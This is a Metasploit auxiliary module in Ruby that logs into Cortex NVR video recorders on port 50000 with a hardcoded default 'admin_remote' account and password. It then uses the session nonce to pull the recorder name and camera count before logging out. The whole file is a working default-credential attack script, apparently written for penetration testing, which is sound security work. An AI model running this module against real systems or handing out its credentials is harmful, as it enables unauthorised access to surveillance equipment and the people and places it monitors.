##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
    include Msf::Exploit::Remote::Tcp

    def initialize
        super(
            'Name'          => %q(Cortex NVR Admin Auth Login),
            'Description'   => %q(Checks for the default admin_remote user on a Cortex NVR system),
            'Author'        => [
                'Terry Antram - 3antrt67[at]solent.ac.uk'
            ],
            'License'       => MSF_LICENSE
        )

        deregister_options('RHOST')
        register_options([
            Opt::RPORT(50000)
        ])
    end

    # API request for login to receive success and nonce if user present
    LOGIN = "login 1 admin_remote ad^min QV Version: 3.2.18603 OS: Windows 8 64-bit\n"

    def run
        begin
            connect
            sock.put(LOGIN)
            data = sock.get_once
            nonce = data.slice(6,26)
            print_good("successfully logged into admin_remote")
            sock.put("get_dvr_name " + nonce + "\n")
            nvrName = sock.get_once
            print_good(nvrName)
            sock.put("get_camera_info " + nonce + "\n")
            cams = sock.get_once
            countcam = cams[16..17]
            print_good(countcam + " cameras present")
            sock.put("logout " + nonce + "\n")
            logout = sock.get_once
            print_good(logout)
        rescue Rex::HostUnreachable
            puts "The host is unreachable."
        rescue Rex::ConnectionTimeout
            puts "Connection has timed out."
        rescue Rex::ConnectionRefused => e
            puts "Connection is refused. #{e.message}"
        ensure
            disconnect
        end
    end
end

